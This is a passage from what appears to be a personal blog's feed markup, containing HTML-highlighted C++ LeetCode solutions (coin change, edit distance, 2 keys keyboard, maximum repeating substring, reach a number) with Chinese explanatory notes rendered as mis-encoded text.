class="number">1</span>) ? <span class="number">-1</span> : dp[amount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>ç¡¬å¸çš„ä»·å€¼ä¸ç”¨-1è€Œç”¨1ï¼Œdpè¡¨ç¤ºç¡¬å¸æ•°ï¼Œæ‰¾minï¼Œé‚£ä¹ˆdpåˆå€¼å°±ä¸èƒ½æ˜¯0<br>æ— é™èƒŒåŒ…ï¼Œå¤–å±‚å®¹é‡ï¼Œå†…å±‚ç‰©å“, è¿™é‡Œæ²¡æœ‰ç†è§£<br>å¦‚æœ<code>dp[amount]</code>æ˜¯<code>amount+1</code>ï¼Œè¯´æ˜æ²¡æœ‰å¡«æ»¡ï¼Œå¦‚æœå¡«æ»¡äº†ï¼Œç¡¬å¸æ•°é‡ä¸€å®šå°äº<code>amount+1</code></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins, <span class="type">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> coinTypes = coins.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(amount+<span class="number">1</span>, amount+<span class="number">1</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= coinTypes; i++) &#123;</span><br><span class="line">            <span class="type">int</span> w = coins[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = w; j &lt;= amount; j++) &#123;</span><br><span class="line">                dp[j] = <span class="built_in">min</span>(dp[j], dp[j-w]+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (dp[amount] == amount+<span class="number">1</span>) ? <span class="number">-1</span> : dp[amount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>å†…å±‚å®¹é‡ï¼Œå¤–å±‚ç‰©å“ä¹Ÿèƒ½è¿‡ï¼Œè¿˜å¯ä»¥å¿«ä¸€ç‚¹</p></blockquote><h2 id="å­—ç¬¦ä¸²ç¼–è¾‘"><a href="#å­—ç¬¦ä¸²ç¼–è¾‘" class="headerlink" title="å­—ç¬¦ä¸²ç¼–è¾‘"></a>å­—ç¬¦ä¸²ç¼–è¾‘</h2><h3 id="72-ç¼–è¾‘è·ç¦»"><a href="#72-ç¼–è¾‘è·ç¦»" class="headerlink" title="72. ç¼–è¾‘è·ç¦»"></a><a href="https://leetcode.cn/problems/edit-distance/">72. ç¼–è¾‘è·ç¦»</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minDistance</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len1 = word1.<span class="built_in">size</span>(), len2 = word2.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(len1+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(len2+<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= len1; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= len2; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len1; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= len2; j++) &#123;</span><br><span class="line">                <span class="type">int</span> x = <span class="built_in">int</span>(word1[i<span class="number">-1</span>] != word2[j<span class="number">-1</span>]);</span><br><span class="line">                dp[i][j] = <span class="built_in">min</span>(x + dp[i<span class="number">-1</span>][j<span class="number">-1</span>], <span class="built_in">min</span>(dp[i<span class="number">-1</span>][j]+<span class="number">1</span>, dp[i][j<span class="number">-1</span>]+<span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[len1][len2];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="650-åªæœ‰ä¸¤ä¸ªé”®çš„é”®ç›˜"><a href="#650-åªæœ‰ä¸¤ä¸ªé”®çš„é”®ç›˜" class="headerlink" title="650. åªæœ‰ä¸¤ä¸ªé”®çš„é”®ç›˜"></a><a href="https://leetcode.cn/problems/2-keys-keyboard/">650. åªæœ‰ä¸¤ä¸ªé”®çš„é”®ç›˜</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minSteps</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            dp[i] = i;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">2</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(i%j == <span class="number">0</span>) &#123; </span><br><span class="line">                    dp[i] = <span class="built_in">min</span>(dp[i], dp[j]+i/j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>å¤æ‚åº¦ä¸º $ n^2 $</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minSteps</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            dp[i] = i;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">2</span>; j*j &lt;= i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(i%j == <span class="number">0</span>) &#123; </span><br><span class="line">                    dp[i] = dp[j] + dp[i/j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœj å¯ä»¥è¢«i æ•´é™¤ï¼Œé‚£ä¹ˆé•¿åº¦i å°±å¯ä»¥ç”±é•¿åº¦j æ“ä½œå¾—åˆ°ï¼Œå…¶æ“ä½œæ¬¡æ•°ç­‰ä»·äºæŠŠä¸€ä¸ªé•¿åº¦ä¸º1çš„A å»¶å±•åˆ°é•¿åº¦ä¸ºi&#x2F;j</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;leetcode 101çš„åŠ¨æ€è§„åˆ’ä¸“é¢˜&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;åŸºæœ¬åŠ¨æ€è§„åˆ’ï¼šä¸€ç»´&quot;&gt;&lt;a href=&quot;#åŸºæœ¬åŠ¨æ€è§„åˆ’ï¼šä¸€ç»´&quot; class=&quot;headerlink&quot; title=&quot;åŸºæœ¬åŠ¨æ€è§„åˆ’ï¼šä¸€ç»´&quot;&gt;&lt;/a&gt;åŸºæœ¬åŠ¨æ€è§„åˆ’ï¼šä¸€ç»´&lt;/h2&gt;&lt;h3 id=&quot;70-çˆ¬æ¥¼æ¢¯&quot;&gt;&lt;a href=&quot;#70-çˆ¬æ¥¼æ¢¯&quot; class=&quot;headerlink&quot; title=&quot;70. çˆ¬æ¥¼æ¢¯&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/climbing-stairs/&quot;&gt;70. çˆ¬æ¥¼æ¢¯&lt;/a&gt;&lt;/h3&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;climbStairs&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; n)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; a=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,b=&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(n&amp;lt;&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;; i &amp;lt;n ; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; c = a+b;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            a=b;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            b=c;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; b;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;dpæ•°ç»„è¡¨ç¤ºä¸Šnå±‚æ¥¼æœ‰å‡ ç§å¯èƒ½&lt;br&gt;è½¬ç§»æ–¹ç¨‹æ˜¯ $ dp[i] &amp;#x3D; dp[i-1] + dp[i-2] $&lt;br&gt;ä¸Šåˆ°ç¬¬iå±‚æœ‰å¯èƒ½ä»ç¬¬i-1å±‚æˆ–i-2å±‚ä¸Šæ¥ï¼Œåˆ™ä¸Šåˆ°iå±‚çš„å¯èƒ½æ•°ç›®å°±æ˜¯ $ dp[i-1] + dp[i-2] $&lt;br&gt;ç”±äºdp[i]åªéœ€è¦å‰ä¸¤ä¸ªæ•°çš„æ•°æ®ï¼Œæ‰€ä»¥å¯ä»¥ä¼˜åŒ–æ‰dpæ•°ç»„ï¼Œç”¨ä¸¤ä¸ªå˜é‡ä»£æ›¿ï¼ŒèŠ‚çœæ•°ç»„ç©ºé—´&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;198-æ‰“å®¶åŠ«èˆ&quot;&gt;&lt;a href=&quot;#198-æ‰“å®¶åŠ«èˆ&quot; class=&quot;headerlink&quot; title=&quot;198. æ‰“å®¶åŠ«èˆ&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/house-robber/&quot;&gt;198. æ‰“å®¶åŠ«èˆ&lt;/a&gt;&lt;/h3&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/tags/LeetCode/"/>
    
    <category term="åŠ¨æ€è§„åˆ’" scheme="https://jingtianer.github.io/home/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
    <category term="LeetCode 101" scheme="https://jingtianer.github.io/home/tags/LeetCode-101/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode-18</title>
    <link href="https://jingtianer.github.io/home/2022/11/07/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9318/"/>
    <id>https://jingtianer.github.io/home/2022/11/07/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9318/</id>
    <published>2022-11-07T03:14:34.000Z</published>
    <updated>2022-11-14T13:52:45.683Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1668-æœ€å¤§é‡å¤å­å­—ç¬¦ä¸²"><a href="#1668-æœ€å¤§é‡å¤å­å­—ç¬¦ä¸²" class="headerlink" title="1668. æœ€å¤§é‡å¤å­å­—ç¬¦ä¸²"></a><a href="https://leetcode.cn/problems/maximum-repeating-substring/">1668. æœ€å¤§é‡å¤å­å­—ç¬¦ä¸²</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxRepeating</span><span class="params">(string sequence, string word)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len1 = sequence.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> len2 = word.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> maxk = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len1;) &#123;</span><br><span class="line">            <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">            <span class="type">int</span> next = i+<span class="number">1</span>;</span><br><span class="line">            <span class="type">bool</span> flag1 = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len2; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(sequence[i+j] != word[j]) &#123;</span><br><span class="line">                    flag = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(!flag1 &amp;&amp; j != <span class="number">0</span> &amp;&amp; sequence[i+j] == word[<span class="number">0</span>]) &#123;</span><br><span class="line">                    next = i+j;</span><br><span class="line">                    flag1=<span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// cout &lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt; k &lt;&lt; &quot; &quot; &lt;&lt; maxk &lt;&lt; endl;</span></span><br><span class="line">            <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">                k++;</span><br><span class="line">                i += len2;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                maxk = <span class="built_in">max</span>(k, maxk);</span><br><span class="line">                <span class="keyword">if</span>(k == <span class="number">0</span>) &#123;</span><br><span class="line">                    i+=<span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    i = i-len2+<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                k = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// cout &lt;&lt; i &lt;&lt; endl;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(maxk, k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>ç¬¨æ–¹æ³•ï¼Œä»å³å‘å·¦æ‰¾ï¼Œé€‚å½“å›æº¯</p></blockquote><h2 id="754-åˆ°è¾¾ç»ˆç‚¹æ•°å­—"><a href="#754-åˆ°è¾¾ç»ˆç‚¹æ•°å­—" class="headerlink" title="754. åˆ°è¾¾ç»ˆç‚¹æ•°å­—"></a><a href="https://leetcode.cn/problems/reach-a-number/">754. åˆ°è¾¾ç»ˆç‚¹æ•°å­—</a></h2><h3 id="è§£æ³•1"><a href="#è§£æ³•1" class="headerlink" title="è§£æ³•1"></a>è§£æ³•1</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reachNumber</span><span class="params">(<span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        target = <span class="built_in">abs</span>(target);</span><br><span class="line">        <span class="type">int</span> n = (<span class="built_in">sqrt</span>(<span class="number">8.0</span>*target+<span class="number">1</span>)<span class="number">-1</span>)/<span class="number">2</span>; <span class="comment">//8.0,é˜²æ­¢intæº¢å‡º</span></span><br><span class="line">        <span class="type">int</span> sum = (n+<span class="number">1</span>)*n/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(sum == target) &#123;</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> diff = target-sum;</span><br><span class="line">        <span class="keyword">if</span>((n % <span class="number">2</span> == <span class="number">1</span> &amp;&amp; diff % <span class="number">2</span> == <span class="number">0</span>) || (n % <span class="number">2</span> == <span class="number">0</span> &amp;&amp; diff % <span class="number">2</span> == <span class="number">1</span>)) &#123;</span><br><span class="line">            n += <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(diff %<span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            n += <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            n += <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é“é¢˜ç›´æ¥æš´åŠ›æœç´¢æ˜¯ä¸å¯è¡Œçš„ï¼Œç®—æ³•æˆä¸º$ O( 2^{ target } ) $ çº§åˆ«</p></blockquote><blockquote><p>è€ƒè™‘åˆ°åªæ±‚æ­¥æ•°ï¼Œè´Ÿæ•°targetå¯ä»¥è½¬åŒ–æˆæ­£æ•°å¤„ç†<br>é¦–å…ˆè®¡ç®— $ sum &#x3D; 1 + 2 + 3 + â€¦ + i + â€¦ + n &lt;&#x3D; target $, å¦‚æœ  $  sum&#x3D;&#x3D;target $ï¼Œåˆ™nå°±æ˜¯æ­¥æ•°<br>å¦åˆ™å¯¹sumè¿›è¡Œè°ƒæ•´ï¼Œè®° $ diff &#x3D; target-sum  &lt;&#x3D; n $ (ä¸€å®šå°äºn+1)ï¼Œæ‰€ä»¥éœ€è¦å…ˆå‡å°sumï¼Œå†åŠ ä¸Šå‡ ä¸ªæ•°ï¼Œä½¿å¾—æ–°çš„sumç­‰äºtarget<br>æƒ…å†µä¸€ï¼Œç¬¬iæ­¥æ”¹ä¸ºå‘å·¦ï¼Œå†åŠ ä¸Šn+1, ä¹Ÿå°±æ˜¯ $ sum - 2i + n+1 $ï¼Œè°ƒæ•´å‰åçš„å·®ä¸º $ delta &#x3D; n + 1 -2i $, $ i &#x3D; 1,2,3,â€¦,n; delta &#x3D; n-1, n-3, n-5 â€¦ $ã€‚è¿™ç§æƒ…å†µå¯¹äº<code>diffå¥‡æ•°nå¶æ•°</code>ï¼Œæˆ–<code>diffå¶æ•°nå¥‡æ•°</code>çš„æƒ…å†µé€‚ç”¨ï¼Œæ€»è®¡æ­¥æ•°<code>n+1</code><br>æƒ…å†µäºŒï¼Œç¬¬iæ­¥æ”¹ä¸ºå‘å·¦ï¼Œå†åŠ ä¸Šn+1å’Œn+2ï¼Œä¹Ÿå°±æ˜¯ $ sum - 2i + n+1 + n+2 $ï¼Œè°ƒæ•´å‰åçš„å·®ä¸º $ delta &#x3D; 2(n-i) + 3 $, $ i &#x3D; 1,2,3,â€¦,n; delta &#x3D; 3, 5, 7, 9, â€¦ $ã€‚è¿™ç§æƒ…å†µå¯¹äº<code>diffå¥‡æ•°ä¸”diff &gt;= 3</code>çš„æƒ…å†µé€‚ç”¨ï¼Œæ€»è®¡æ­¥æ•°<code>n+2</code><br>æƒ…å†µä¸‰ï¼Œå‡å»<code>n+1</code>,åŠ ä¸Š<code>n+2</code>ï¼Œæ˜¾ç„¶ä½¿ç”¨äº<code>diff=1</code>çš„æƒ…å†µï¼Œæ€»è®¡æ­¥æ•°<code>n+2</code>ï¼Œå¯ä»¥å’Œæƒ…å†µäºŒåˆå¹¶<br>æƒ…å†µå››ï¼Œä»¥ä¸Šæ²¡æœ‰è¦†ç›–åˆ°çš„æƒ…å†µï¼Œä¸¾ä¸ªä¾‹å­å¯çŸ¥ï¼Œæ€»è®¡æ­¥æ•°<code>n+3</code></p></blockquote><h3 id="è§£æ³•2"><a href="#è§£æ³•2" class="headerlink" title="è§£æ³•2"></a>è§£æ³•2</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reachNumber</span><span class="params">(<span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        target = <span class="built_in">abs</span>(target);</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(sum &lt; target) &#123;</span><br><span class="line">            n++;</span><br><span class="line">            sum += n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((sum-target) % <span class="number">2</span> == <span class="number">0</span>) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">while</span>((sum-target)%<span class="number">2</span>) &#123;</span><br><span class="line">            n++;</span><br><span class="line">            sum += n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>è®¡ç®— $ sum&#x3D;1+2+3+â€¦+n &gt;&#x3D; target $<br>æƒ…å†µä¸€ï¼šå¦‚æœ $ diff &#x3D; sum-target &lt;&#x3D; n $ æ˜¯å¶æ•°ï¼Œåˆ™æ­¥æ•°å°±æ˜¯nã€‚ ç”±äºdiff &lt;&#x3D; n,æ‰€ä»¥å¯ä»¥è®©ç¬¬iæ­¥å˜æˆå‘å·¦ï¼Œå³ $ sum - 2i, i&#x3D;0,1,2,3,â€¦,n+1 $ï¼Œåˆ™åˆšå¥½å¯ä»¥å˜æˆtarget<br>å…¶ä»–æƒ…å†µï¼šå¦‚æœdiffæ˜¯å¥‡æ•°ï¼Œåˆ™ç»§ç»­åœ¨sumçš„åŸºç¡€ä¸ŠåŠ n,ç›´åˆ°diffä¸ºå¶æ•°</p></blockquote><h3 id="æ–¹æ³•3"><a href="#æ–¹æ³•3" class="headerlink" title="æ–¹æ³•3"></a>æ–¹æ³•3</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span 